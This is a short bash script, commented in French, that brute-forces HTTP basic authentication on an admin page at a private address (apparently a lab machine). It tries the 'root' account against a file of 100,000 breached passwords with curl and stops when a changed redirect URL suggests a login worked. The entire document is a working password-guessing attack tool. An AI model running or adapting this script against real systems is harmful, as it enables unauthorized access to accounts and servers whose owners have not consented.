#!/bin/bash

# Définir les variables
BASE_URL="http://192.168.56.101/admin/"
USERNAME="root"
PASSWORD_FILE="PwnedPasswordsTop100k.txt"

# Boucle pour lire chaque mot de passe du fichier
while IFS= read -r password; do
    echo "Trying password: $password"
    
    # Utilisation de curl pour envoyer une requête HTTP avec le mot de passe et suivre les redirections
    redirected_url=$(curl -s -L -o /dev/null -w "%{url_effective}" -u "$USERNAME:$password" "$BASE_URL")
    echo $redirected_url
    
    # Vérifier si l'URL redirigée est différente de l'URL initiale
    if [[ "$BASE_URL" != "$redirected_url" ]]; then
        echo "Password found: $password"
        exit 0  # Sortir du script si le mot de passe est trouvé
    else
        echo "Password not valid: $password"
    fi

done < "$PASSWORD_FILE"

echo "Password not found in the list."
exit 1